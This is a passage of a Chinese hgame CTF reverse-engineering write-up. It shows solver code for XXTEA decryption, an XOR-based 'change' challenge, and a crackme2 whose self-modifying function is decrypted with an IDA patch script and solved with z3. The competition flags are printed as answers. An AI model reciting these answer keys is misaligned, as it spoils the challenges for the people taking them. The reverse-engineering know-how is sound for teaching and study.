class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s6;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> delta;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s5;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s4; <span class="comment">// r15d</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s3; <span class="comment">// r14d</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s2; <span class="comment">// ebp</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s1; <span class="comment">// esi</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s0; <span class="comment">// r11d</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// ebx</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> s7; <span class="comment">// [rsp+40h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flag[<span class="number">8</span>] = &#123; <span class="number">0x506FB5C3</span>, <span class="number">0xB9358F45</span>, <span class="number">0xC91AE8C7</span>, <span class="number">0x3820E280</span>, <span class="number">0xD13ABA83</span>, <span class="number">0x975CF554</span>, <span class="number">0x4352036B</span>, <span class="number">0x1CD20447</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x00001234</span>, <span class="number">0x00002341</span>, <span class="number">0x00003412</span>, <span class="number">0x00004123</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> key_[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0x00001234</span>, <span class="number">0x00002341</span>, <span class="number">0x00003412</span>, <span class="number">0x00004123</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">s7 = flag[<span class="number">7</span>];</span><br><span class="line">s1 = flag[<span class="number">1</span>];</span><br><span class="line">s2 = flag[<span class="number">2</span>];</span><br><span class="line">s3 = flag[<span class="number">3</span>];</span><br><span class="line">s4 = flag[<span class="number">4</span>];</span><br><span class="line">s5 = flag[<span class="number">5</span>];</span><br><span class="line">s6 = flag[<span class="number">6</span>];</span><br><span class="line">s0 = flag[<span class="number">0</span>];</span><br><span class="line">delta = <span class="number">0</span>;</span><br><span class="line">delta += <span class="number">0x7937B99E</span> * <span class="number">12</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++) &#123;</span><br><span class="line">v11 = key[(delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">s7 -= (((s6 ^ key[(delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span> ^ <span class="number">3</span>]) + (delta ^ flag[<span class="number">0</span>])) ^ (((<span class="number">16</span> * s6) ^ (flag[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>)) + ((s6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * flag[<span class="number">0</span>]))));</span><br><span class="line">s6 -= ((s5 ^ key[(delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span> ^ <span class="number">2</span>]) + (delta ^ s7)) ^ (((<span class="number">16</span> * s5) ^ (s7 &gt;&gt; <span class="number">3</span>)) + ((s5 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * s7)));</span><br><span class="line">s5 -= ((delta ^ s6) + (s4 ^ key[(delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span> ^ <span class="number">1</span>])) ^ (((<span class="number">16</span> * s4) ^ (s6 &gt;&gt; <span class="number">3</span>)) + ((s4 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * s6)));</span><br><span class="line"><span class="comment">//flag[0] = s0;</span></span><br><span class="line">s4 -= ((delta ^ s5) + (s3 ^ v11)) ^ (((<span class="number">16</span> * s3) ^ (s5 &gt;&gt; <span class="number">3</span>)) + ((s3 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * s5)));</span><br><span class="line">s3 -= ((delta ^ s4) + (s2 ^ key[(delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span> ^ <span class="number">3</span>])) ^ (((<span class="number">16</span> * s2) ^ (s4 &gt;&gt; <span class="number">3</span>)) + ((s2 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * s4)));</span><br><span class="line">s2 -= ((delta ^ s3) + (s1 ^ key[(delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span> ^ <span class="number">2</span>])) ^ (((<span class="number">16</span> * s1) ^ (s3 &gt;&gt; <span class="number">3</span>)) + ((s1 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * s3)));</span><br><span class="line">s1 -= ((delta ^ s2) + (flag[<span class="number">0</span>] ^ key[(delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span> ^ <span class="number">1</span>])) ^ (((<span class="number">16</span> * flag[<span class="number">0</span>]) ^ (s2 &gt;&gt; <span class="number">3</span>)) + ((flag[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * s2)));</span><br><span class="line"><span class="comment">//s0 = flag[0] - (((delta ^ s1) + (s7 ^ v11)) ^ (((16 * s7) ^ (s1 &gt;&gt; 3)) + ((s7 &gt;&gt; 5) ^ (4 * s1))));</span></span><br><span class="line">flag[<span class="number">0</span>] -= (((delta ^ s1) + (s7 ^ v11)) ^ (((<span class="number">16</span> * s7) ^ (s1 &gt;&gt; <span class="number">3</span>)) + ((s7 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * s1))));</span><br><span class="line">delta -= <span class="number">0x7937B99E</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag[0] = s0;</span></span><br><span class="line">flag[<span class="number">7</span>] = s7;</span><br><span class="line">flag[<span class="number">1</span>] = s1;</span><br><span class="line">flag[<span class="number">2</span>] = s2;</span><br><span class="line">flag[<span class="number">3</span>] = s3;</span><br><span class="line">flag[<span class="number">4</span>] = s4;</span><br><span class="line">flag[<span class="number">5</span>] = s5;</span><br><span class="line">flag[<span class="number">6</span>] = s6;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">cout &lt;&lt; hex &lt;&lt; flag[i] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//6d616768</span></span><br><span class="line"><span class="comment">//74627b65</span></span><br><span class="line"><span class="comment">//695f6165</span></span><br><span class="line"><span class="comment">//5f615f73</span></span><br><span class="line"><span class="comment">//64726168</span></span><br><span class="line"><span class="comment">//636e655f</span></span><br><span class="line"><span class="comment">//74707972</span></span><br><span class="line"><span class="comment">//7d6e6f69</span></span><br><span class="line"><span class="comment">//hgame&#123;btea_is_a_hard_encryption&#125;</span></span><br></pre></td></tr></table></figure><h3 id="change">change</h3><p>直接ida打开<br>主函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sub_7FF787FD21E0(v10, <span class="string">&quot;am2qasl&quot;</span>, envp);</span><br><span class="line">  v6 = <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;__ExceptionPtr&gt;::operator=((__int64)v7, v10);</span><br><span class="line">  sub_7FF787FD2280(a, v6);</span><br><span class="line">  sub_7FF787FD1410(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;plz input your flag:&quot;</span>);</span><br><span class="line">  sub_7FF787FD10F0(<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;flag);</span><br><span class="line">  sub_7FF787FD29A0((__int64)a, (__int64)b, (__int64)&amp;flag);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">24</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    last = byte_7FF787FD8000[i];</span><br><span class="line">    <span class="keyword">if</span> ( last != *(<span class="type">char</span> *)sub_7FF787FD2960((__int64)b, i) )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_7FF787FD1410(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;sry,try again...&quot;</span>);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(b);</span><br><span class="line">      sub_7FF787FD2780(a);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v10);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_7FF787FD1410(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Congratulations!&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(b);</span><br><span class="line">  sub_7FF787FD2780(a);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v10);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>化简一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sub_7FF787FD10F0(<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;flag);</span><br><span class="line">  sub_7FF787FD29A0((__int64)a, (__int64)b, (__int64)&amp;flag);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">24</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    last = byte_7FF787FD8000[i];</span><br><span class="line">    <span class="keyword">if</span> ( last != *(<span class="type">char</span> *)sub_7FF787FD2960((__int64)b, i) )</span><br></pre></td></tr></table></figure><p>那就完了，sub_7FF787FD29A0肯定是加密</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *__fastcall <span class="title function_">sub_7FF787FD29A0</span><span class="params">(_QWORD *a, _QWORD *b, _QWORD *flag)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+20h] [rbp-58h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> Duration; <span class="comment">// [rsp+28h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [rsp+30h] [rbp-48h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+48h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v11; <span class="comment">// [rsp+58h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;__ExceptionPtr&gt;::operator=((__int64)b, flag);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="type">unsigned</span> __int64)unknown_libname_20(b); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i % <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_7FF787FD2D20(sub_7FF787FD3670);</span><br><span class="line">      v11 = unknown_libname_20(a);</span><br><span class="line">      v9 = *(<span class="type">char</span> *)sub_7FF787FD2960(a, i % v11);</span><br><span class="line">      v5 = (<span class="type">char</span> *)sub_7FF787FD2960(b, i);</span><br><span class="line">      beep(*v5, v9);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      sub_7FF787FD2D20(sub_7FF787FD3650);</span><br><span class="line">      v10 = unknown_libname_20(a);</span><br><span class="line">      Duration = *(<span class="type">char</span> *)sub_7FF787FD2960(a, i % v10);</span><br><span class="line">      v3 = (<span class="type">char</span> *)sub_7FF787FD2960(b, i);</span><br><span class="line">      beep(*v3, Duration);</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)sub_7FF787FD2960(b, i) = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据奇数位和偶数位来分别加密：</p><p>奇数位直接和key异或<br>偶数位异或完加10</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">last = cal([<span class="number">0x13</span>, <span class="number">0x0A</span>, <span class="number">0x5D</span>, <span class="number">0x1C</span>, <span class="number">0x0E</span>, <span class="number">0x08</span>, <span class="number">0x23</span>, <span class="number">0x06</span>, </span><br><span class="line">        <span class="number">0x0B</span>, <span class="number">0x4B</span>, <span class="number">0x38</span>, <span class="number">0x22</span>, <span class="number">0x0D</span>, <span class="number">0x1C</span>, <span class="number">0x48</span>, <span class="number">0x0C</span>, </span><br><span class="line">        <span class="number">0x66</span>, <span class="number">0x15</span>, <span class="number">0x48</span>, <span class="number">0x1B</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x10</span>, <span class="number">0x4F</span>, </span><br><span class="line">        ])</span><br><span class="line">a = cal([<span class="number">0x61</span>, <span class="number">0x6D</span>, <span class="number">0x32</span>, <span class="number">0x71</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6C</span>])</span><br><span class="line">c = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(last)):</span><br><span class="line">        <span class="keyword">if</span> (i%<span class="number">2</span>):</span><br><span class="line">                c += <span class="built_in">chr</span>(last[i])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                c += <span class="built_in">chr</span>(last[i]-<span class="number">10</span>)</span><br><span class="line">pxor(c,a)</span><br><span class="line"><span class="comment">#hgame&#123;ugly_Cpp_and_hook&#125;</span></span><br></pre></td></tr></table></figure><h3 id="crackme2">crackme2</h3><p>这个题把我坑惨了…</p><p>ida打开之后反编译有标红，对应位置的指令是：mov     byte ptr ds:0, 1<br>于是准备先不管，去看主体逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sub_1400035C4(<span class="string">&quot;%50s&quot;</span>, v6);</span><br><span class="line">MEMORY[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">v3 = sub_14000105C(v6);</span><br><span class="line">v4 = <span class="string">&quot;right flag!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> ( !v3 )</span><br><span class="line">  v4 = <span class="string">&quot;wrong flag!&quot;</span>;</span><br><span class="line"><span class="built_in">puts</span>(v4);</span><br></pre></td></tr></table></figure><p>很明显v6是flag，v3是最后的校验信息1或0</p><p>sub_14000105C打开后是换表base64</p><p>解密后发现是hgame{th1s_i5_fake_fl4g}假的，那哪里有问题呢</p><p>既然不能正确反编译主函数，那就尝试直接读汇编指令</p><p><img src="https://s2.loli.net/2024/02/26/uNo8mcwDzBqjpRF.png" alt="image-20240226194726601"></p><p>在这一段发现了virtalprotect函数，好家伙！原来是加密了。</p><p>阅读后可知，是把加密函数和一个位置异或加密了，运行解密脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start = 0x14000105C</span><br><span class="line">loop = 0x246a</span><br><span class="line">j = 0</span><br><span class="line">for i in range(start,loop+start):</span><br><span class="line">    patch_byte(i,get_wide_byte(i)^get_wide_byte(0x140006000+j))</span><br><span class="line">    j += 1</span><br></pre></td></tr></table></figure><p>在用u+c+p组合拳然后tab反汇编后是多项式方程，用z3求解即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a1 = [BitVec(<span class="string">&#x27;a1[%i]&#x27;</span> % i,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">v1 = a1[<span class="number">25</span>]</span><br><span class="line">v2 = a1[<span class="number">21</span>]</span><br><span class="line">v3 = a1[<span class="number">31</span>]</span><br><span class="line">v4 = a1[<span class="number">29</span>]</span><br><span class="line">v5 = a1[<span class="number">0</span>]</span><br><span class="line">v6 = a1[<span class="number">23</span>]</span><br><span class="line">v7 = a1[<span class="number">8</span>]</span><br><span class="line">v8 = a1[<span class="number">28</span>]</span><br><span class="line">v9 = a1[<span class="number">12</span>]</span><br><span class="line">v10 = a1[<span class="number">3</span>]</span><br><span class="line">v11 = a1[<span class="number">2</span>]</span><br><span class="line">v19 = a1[<span class="number">30</span>]</span><br><span class="line">v15 = a1[<span class="number">18</span>]</span><br><span class="line">v16 = a1[<span class="number">24</span>]</span><br><span class="line">v27 = a1[<span class="number">11</span>]</span><br><span class="line">v17 = a1[<span class="number">26</span>]</span><br><span class="line">v30 = a1[<span class="number">14</span>]</span><br><span class="line">v40 = a1[<span class="number">7</span>]</span><br><span class="line">v26 = a1[<span class="number">20</span>]</span><br><span class="line">v37 = <span class="number">2</span> * v26</span><br><span class="line">v42 = a1[<span class="number">22</span>]</span><br><span class="line">v28 = a1[<span class="number">1</span>]</span><br><span class="line">v25 = a1[<span class="number">27</span>]</span><br><span class="line">v21 = a1[<span class="number">19</span>]</span><br><span class="line">v23 = a1[<span class="number">16</span>]</span><br><span class="line">v31 = a1[<span class="number">13</span>]</span><br><span class="line">v29 = a1[<span class="number">10</span>]</span><br><span class="line">v41 = a1[<span class="number">5</span>]</span><br><span class="line">v24 = a1[<span class="number">4</span>]</span><br><span class="line">v20 = a1[<span class="number">15</span>]</span><br><span class="line">v39 = a1[<span class="number">17</span>]</span><br><span class="line">v22 = a1[<span class="number">6</span>]</span><br><span class="line">v18 = a1[<span class="number">9</span>]</span><br><span class="line">v33 = <span class="number">2</span> * v41</span><br><span class="line">v38 = <span class="number">2</span> * v16</span><br><span class="line">v32 = <span class="number">2</span> * v18</span><br><span class="line">v35 = v25 + v30</span><br><span class="line">v34 = <span class="number">2</span> * v31</span><br><span class="line">v12 = v10 + <span class="number">2</span> * (v31 + <span class="number">4</span> * (v29 + v17)) + v31 + <span class="number">4</span> * (v29 + v17)</span><br><span class="line">v36 = <span class="number">3</span> * v21</span><br><span class="line">v13 = v6 + v1 + <span class="number">8</span> * v6 + <span class="number">4</span> * (v8 + <span class="number">2</span> * v27)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> a1:</span><br><span class="line">    s.add(a &gt;= <span class="number">32</span>, a &lt;= <span class="number">126</span>)</span><br><span class="line">s.add(a1[<span class="number">0</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;h&#x27;</span>))</span><br><span class="line">s.add(a1[<span class="number">1</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;g&#x27;</span>))</span><br><span class="line">s.add(a1[<span class="number">2</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">s.add(a1[<span class="number">3</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>))</span><br><span class="line">s.add(a1[<span class="number">4</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;e&#x27;</span>))</span><br><span class="line">s.add(a1[<span class="number">5</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;&#123;&#x27;</span>))</span><br><span class="line">s.add(a1[<span class="number">31</span>]==<span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>))</span><br><span class="line"></span><br><span class="line">s.add(v18 +  <span class="number">201</span> * v24 +  <span class="number">194</span> * v10 +  <span class="number">142</span> * v20 +  <span class="number">114</span> * v39 +  <span class="number">103</span> * v11 +  <span class="number">52</span> * (v17 + v31) +  ((v9 + v23) &lt;&lt; <span class="number">6</span>) +  <span class="number">14</span> * (v21 + <span class="number">4</span> * v25 + v25) +  <span class="number">9</span> * (v40 + <span class="number">23</span> * v27 + v2 + <span class="number">3</span> * v1 + <span class="number">4</span> * v2 + <span class="number">4</span> * v6) +  <span class="number">5</span> * (v16 + <span class="number">23</span> * v30 + <span class="number">2</span> * (v3 + <span class="number">2</span> * v19) + <span class="number">5</span> * v5 + <span class="number">39</span> * v15 + <span class="number">51</span> * v4) +  <span class="number">24</span> * (v8 + <span class="number">10</span> * v28 + <span class="number">4</span> * (v42 + v7 + <span class="number">2</span> * v26)) +  <span class="number">62</span> * v22 +  <span class="number">211</span> * v41 +  <span class="number">212</span> * v29 == <span class="number">296473</span>)</span><br><span class="line">s.add(<span class="number">207</span> * v41 +  <span class="number">195</span> * v22 +  <span class="number">151</span> * v40 +  <span class="number">57</span> * v5 +  <span class="number">118</span> * v6 +  <span class="number">222</span> * v42 +  <span class="number">103</span> * v7 +  <span class="number">181</span> * v8 +  <span class="number">229</span> * v9 +  <span class="number">142</span> * v31 +  <span class="number">51</span> * v29 +  <span class="number">122</span> * (v26 + v20) +  <span class="number">91</span> * (v2 + <span class="number">2</span> * v16) +  <span class="number">107</span> * (v27 + v25) +  <span class="number">81</span> * (v17 + <span class="number">2</span> * v18 + v18) +  <span class="number">45</span> * (v19 + <span class="number">2</span> * (v11 + v24) + v11 + v24) +  <span class="number">4</span> * (<span class="number">3</span> * (v23 + a1[<span class="number">19</span>] + <span class="number">2</span> * v23 + <span class="number">5</span> * v4) + v39 + <span class="number">29</span> * (v10 + v1) + <span class="number">25</span> * v15) +  <span class="number">26</span> * v28 +  <span class="number">101</span> * v30 +  <span class="number">154</span> * v3 == <span class="number">354358</span>)</span><br><span class="line"></span><br><span class="line">s.add(And((<span class="number">177</span> * v40 +  <span class="number">129</span> * v26 +  <span class="number">117</span> * v42 +  <span class="number">143</span> * v28 +  <span class="number">65</span> * v8 +  <span class="number">137</span> * v25 +  <span class="number">215</span> * v21 +  <span class="number">93</span> * v31 +  <span class="number">235</span> * v39 +  <span class="number">203</span> * v11 +  <span class="number">15</span> * (v7 + <span class="number">17</span> * v30) +  <span class="number">2</span>* (v24 +  <span class="number">91</span> * v9 +  <span class="number">95</span> * v29 +  <span class="number">51</span> * v41 +  <span class="number">81</span> * v20 +  <span class="number">92</span> * v18 +  <span class="number">112</span> * (v10 + v6) +  <span class="number">32</span> * (v22 + <span class="number">2</span> * (v1 + v23)) +  <span class="number">6</span> * (v2 + <span class="number">14</span> * v16 + <span class="number">19</span> * v15) +  <span class="number">83</span> * v5 +  <span class="number">53</span> * v4 +  <span class="number">123</span> * v19) +  v17 +  <span class="number">175</span> * v27 +  <span class="number">183</span> * v3 == <span class="number">448573</span>)</span><br><span class="line">    ,  (<span class="number">113</span> * v19 +  <span class="number">74</span> * v3 +  <span class="number">238</span> * v6 +  <span class="number">140</span> * v2 +  <span class="number">214</span> * v26 +  <span class="number">242</span> * v8 +  <span class="number">160</span> * v21 +  <span class="number">136</span> * v23 +  <span class="number">209</span> * v9 +  <span class="number">220</span> * v31 +  <span class="number">50</span> * v24 +  <span class="number">125</span> * v10 +  <span class="number">175</span> * v20 +  <span class="number">23</span> * v39 +  <span class="number">137</span> * v22 +  <span class="number">149</span> * v18 +  <span class="number">83</span> * (v4 + <span class="number">2</span> * v30) +  <span class="number">21</span> * (<span class="number">9</span> * v29 + v16) +  <span class="number">59</span> * (<span class="number">4</span> * v27 + v17) +  <span class="number">41</span> * (v1 + v41) +  <span class="number">13</span> * (v7 + <span class="number">11</span> * (v40 + v15) + <span class="number">6</span> * v42 + <span class="number">4</span> * (v28 + <span class="number">2</span> * v11) + v28 + <span class="number">2</span> * v11 + <span class="number">17</span> * v5) +  <span class="number">36</span> * v25 == <span class="number">384306</span>)</span><br><span class="line">    ,  (<span class="number">229</span> * v21 +  <span class="number">78</span> * v1 +  v2 +  v9 +  <span class="number">133</span> * v27 +  <span class="number">74</span> * v6 +  <span class="number">69</span> * v26 +  <span class="number">243</span> * v7 +  <span class="number">98</span> * v28 +  <span class="number">253</span> * v8 +  <span class="number">142</span> * v25 +  <span class="number">175</span> * v31 +  <span class="number">105</span> * v41 +  <span class="number">221</span> * v10 +  <span class="number">121</span> * v39 +  <span class="number">218</span> * (v19 + v29) +  <span class="number">199</span> * (v24 + v30) +  <span class="number">33</span> * (v40 + <span class="number">7</span> * v17) +  <span class="number">4</span> * (<span class="number">27</span> * v20 + <span class="number">50</span> * v11 + <span class="number">45</span> * v18 + <span class="number">19</span> * (v3 + v42) + v16 + <span class="number">16</span> * v23 + <span class="number">52</span> * v4) +  <span class="number">195</span> * v22 +  <span class="number">211</span> * v5 +  <span class="number">153</span> * v15 == <span class="number">424240</span>)</span><br><span class="line">    ,  (<span class="number">181</span> * v25 +  <span class="number">61</span> * v2 +  <span class="number">65</span> * v21 +  <span class="number">58</span> * v31 +  <span class="number">170</span> * v29 +  <span class="number">143</span> * v24 +  <span class="number">185</span> * v10 +  <span class="number">86</span> * v11 +  <span class="number">97</span> * v22 +  <span class="number">235</span> * (v23 + v27) +  <span class="number">3</span>* (<span class="number">53</span> * v41 +  <span class="number">74</span> * (v8 + v3) +  <span class="number">13</span> * (v42 + <span class="number">6</span> * v9) +  <span class="number">11</span> * (v39 + <span class="number">7</span> * v20) +  <span 